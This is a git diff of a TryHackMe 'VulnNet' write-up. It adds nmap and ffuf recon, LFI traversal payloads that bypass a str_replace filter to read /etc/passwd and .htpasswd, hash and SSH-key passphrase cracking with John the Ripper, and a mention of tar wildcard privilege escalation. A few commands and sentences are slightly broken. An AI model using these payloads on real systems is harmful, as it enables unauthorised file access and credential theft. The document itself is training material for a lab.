@@ -1,17 +1,23 @@
 # Try Hack Me - VulnNet
 # Author: Atharva Bordavekar
 # Difficulty: Medium
-# Points: 
-# Vulnerabilities:
+# Points: 60
+# Vulnerabilities: LFI, cronjob abuse via tar wildcard injection
 
 # Phase 1 - Reconnaissance:
 
+first lets add the hostname in our /etc/hosts file
+```bash
+echo "<target_ip> /etc/hosts" | sudo tee -a /etc/hosts
+```
 nmap scan:
 ```bash
 nmap -p- --min-rate=1000 <target_ip>
 ```
 PORT   STATE SERVICE
+
 22/tcp open  ssh
+
 80/tcp open  http
 
 lets enumerate the webpage at the port 80 to find any leads. using gobuster, i did not find anything interesting. in the top right corner, i found a sign in page. i accessed it at /login.html. tried defualt credentials, hydra bruteforcing with the username admin, multiple sql injections but none of that worked. after an hour of manual enumeration all i found was dead ends.
@@ -22,6 +28,8 @@ i remembered one crucial thing that whenever there is a hostname given in a CTF,
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://vulnnet.thm/ -H 'Host: FUZZ.vulnnet.thm' -fs  5829
 ```
 `NOTE: make sure you filter out the default page size which is 5829 bytes`
+
+![image0](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/subdomainbetter.png)
 
 we get a hit at broadcast.vulnnet.thm!!! lets add it to our /etc/hosts file
 
@@ -38,10 +46,21 @@ zaproxy
 
 we will set the target url to http://vulnnet.thm, activvate ajax spider and attack the website. after sometime we find a highly critical vulnerability at the location /index.php?referer
 
+![image1](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/zap.png)
+
 we find an LFI!!! using this it is possible to view the files on the system. we can view the /etc/passwd file.
 
-lets use this to view the /index.php file to find any sanitizations carried out by the devs to avoid LFI.
+```bash
+http://vulnnet.thm/index.php/?referer=..//..//..//..//etc/passwd
+```
 
+![image2](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/LFI.png)
+
+important thing to note here is that we wouldn't have noticed this file inclusion vulnerability without zaproxy since the output is revealed in the source code only and does not get displayed on the main page since it is not inside any html tags.
+lets use this to view the /index.php file to find any sanitizations carried out by the devs to avoid LFI.
+```bash
+http://vulnnet.thm/index.php/?referer=..//..//..//..//index.php
+```
 we find this block of code in the index.php which is used as a security measure against LFI
 
 ```bash
@@ -51,16 +70,19 @@ $filter = str_replace('../','',$file);
 include($filter);
 ?>
 ```
-
-we can easily bypass this security feature by using something like "..//..//..//..//" 
+we can easily bypass this security feature by using something like "..//..//..//..//" which i 
 
 now remember we had to find some credentials? i remember that we can possibly access the .htpasswd file we found using gobuster. lets use the same LFI to get the contents of the file. but first we will have to do some google dorking to find the default location of the .htpasswd file
+
+![image3](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/googledorking.png)
 
 we finally have the path to the .htpasswd file, now lets access this via the browser and then view the source code.
 
 ```bash
 http://vulnnet.thm/index.php/?refered=..//..//..//..//etc/apache2/.htpasswd
 ```
+![image4](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/htpasswd.png)
+
 now we can see some credentials in the source code. lets use them at the login page at the http://broadcast.vulnnet.thm url, since it is a password hash, we will first crack it using john the ripper
 
 save the password hash inside a file named dev_hash.txt
@@ -68,9 +90,17 @@ save the password hash inside a file named dev_hash.txt
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt dev_hash.txt
 ```
-after a couple of minutes, we find the cracked password. we use it at the login page. now we can see a website named "ClipBucket". 
+after a couple of minutes, we find the cracked password.
+
+![image5](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/johnny1.png)
+
+we use it at the login page. now we can see a website named "ClipBucket".
+
+![image](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/Screenshot%202026-01-22%20at%2016-33-12%20-.png)
 
 in the source code, we find the exact version which is 4.0
+
+![image6](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/Screenshot%202026-01-22%20at%2016-37-04%20http%20__broadcast.vulnnet.thm_signup.php.png)
 
 lets use searchsploit to get some exploits for this specific version of ClipBucket. 
 
@@ -138,6 +168,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
 ```
 we get the passphrase of the id_rsa after a couple of minutes. lets use the -i flag to access the ssh shell as server-management.
 
+![image7](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/johnnny.png)
+
 ```bash
 #first give the id_rsa the required permissions:
 chmod 600 id_rsa
@@ -194,7 +226,7 @@ cat > exploit.sh << 'EOF'
 #now give make the script executable
 chmod +x exploit.sh
 ```
-now once we have created the exploit.sh script, we will have to create two more files which will be percieved by tar to execute the file exploit.sh. the explanation of the vulnerability is explained beuatifully by DeepSeek in the images below:
+now once we have created the exploit.sh script, we will have to create two more files which will be percieved by tar to execute the file exploit.sh. the explanation of the vulnerability is explained beuatifuly by DeepSeek :
 
 ```bash
 Tar Checkpoint Exploit Explained
